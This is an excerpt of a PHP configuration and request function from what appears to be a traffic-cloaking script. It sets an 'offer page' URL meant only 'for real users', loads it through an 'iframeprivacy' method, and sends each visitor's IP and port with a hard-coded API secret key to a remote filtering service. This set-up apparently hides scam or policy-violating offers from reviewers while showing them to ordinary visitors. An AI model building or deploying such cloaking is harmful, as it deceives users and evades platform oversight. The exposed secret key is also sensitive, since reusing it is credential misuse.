...
/* Required settings     */
$HCSET['OFFER_PAGE'] = 'https://xetra360.io/main.php';//PHP/HTML file or URL offer used for real users
...
$HCSET['OFFER_METHOD'] = 'iframeprivacy';
...
$HCSET['API_SECRET_KEY'] = 'v1e37fca99ff49428f970561c6658623b3';
/*********************************************/
...
function apiRequest($ip, $port, $HCSET, $HCSETdata)
{
    ...
    $url = 'http://'.$host.'/basic?ip=' . $ip . '&port=' . $port . '&key=' . $HCSET['API_SECRET_KEY'] . '&sign=v21092493455&js=false&stage='.$HCSET['stage'];
